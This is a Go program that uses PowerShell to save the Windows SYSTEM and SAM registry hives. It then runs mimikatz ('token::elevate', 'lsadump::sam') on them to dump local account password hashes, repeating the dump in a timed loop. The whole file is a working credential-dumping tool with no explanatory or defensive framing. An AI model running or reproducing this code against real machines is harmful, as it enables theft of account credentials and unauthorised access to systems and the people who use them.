package main

import (
	"fmt"
	ps "github.com/bhendo/go-powershell"
	"github.com/bhendo/go-powershell/backend"
	"os"
	"sync"
	"time"
)

func work() {
	back := &backend.Local{}
	shell, err := ps.New(back)
	if err != nil {
		panic(err)
	}
	defer shell.Exit()
	err = os.Chdir("mimi/x64")
	if err != nil {
		panic(err)
		return
	}
	stdout, _, err := shell.Execute("reg save HKLM\\SYSTEM mimi/x64/system2.hiv")
	if err != nil {
		panic(err.Error())
	}
	stdout, _, err = shell.Execute("reg save HKLM\\SAM mimi/x64/sam2.hiv")
	if err != nil {
		panic(err.Error())
	}
	fmt.Println(stdout)
	stdout, _, err = shell.Execute("cd mimi\\x64 ; .\\mimikatz 'token::elevate' lsadump::sam system2.hiv sam2.hiv exit")
	if err != nil {
		panic(err.Error())
	}
	fmt.Println(stdout)
}

func routine(command <-chan string, wg *sync.WaitGroup) {
	defer wg.Done()
	var status = "Play"
	for {
		select {
		case cmd := <-command:
			fmt.Println(cmd)
			switch cmd {
			case "Stop":
				return
			case "Pause":
				status = "Pause"
			default:
				status = "Play"
			}
		default:
			if status == "Play" {
				work()
			}
		}
	}
}

func main() {
	var wg sync.WaitGroup

	command := make(chan string)
	for true {
		wg.Add(1)
		go routine(command, &wg)

		time.Sleep(1 * time.Second)
		command <- "Pause"

		time.Sleep(10 * time.Second)
		command <- "Play"

		time.Sleep(10 * time.Second)
		command <- "Stop"

		wg.Wait()
	}
}
